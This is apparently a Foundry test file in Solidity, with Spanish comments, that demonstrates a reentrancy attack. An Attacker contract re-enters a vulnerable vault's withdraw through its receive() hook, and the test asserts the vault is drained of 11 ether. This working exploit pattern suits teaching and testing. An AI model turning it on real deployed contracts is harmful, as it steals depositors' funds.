// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {VulnerableVault} from "../src/VulnerableVault.sol";

contract Attacker {
    VulnerableVault public immutable vault;
    uint256 public constant AMOUNT = 1 ether;

    constructor(VulnerableVault _vault) {
        vault = _vault;
    }

    function attack() external payable {
        require(msg.value == AMOUNT, "send 1 ether");
        vault.deposit{value: AMOUNT}();
        vault.withdraw();
    }

    // Se ejecuta cada vez que el vault le manda ETH: vuelve a entrar
    receive() external payable {
        if (address(vault).balance >= AMOUNT) {
            vault.withdraw();
        }
    }
}

contract VulnerableVaultTest is Test {
    VulnerableVault vault;
    Attacker attacker;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address eve = makeAddr("eve");

    function setUp() public {
        vault = new VulnerableVault();
        vm.deal(alice, 5 ether);
        vm.deal(bob, 5 ether);
        vm.deal(eve, 1 ether);
        vm.prank(alice);
        vault.deposit{value: 5 ether}();
        vm.prank(bob);
        vault.deposit{value: 5 ether}();
        attacker = new Attacker(vault);
    }

    function test_ReentrancyDrainsVault() public {
        vm.prank(eve);
        attacker.attack{value: 1 ether}();

        assertEq(address(vault).balance, 0);              // el vault quedó vacío
        assertEq(address(attacker).balance, 11 ether);    // depositó 1, se llevó 11
        assertEq(vault.balances(alice), 5 ether);         // el contrato "cree" que Alice tiene 5
    }
}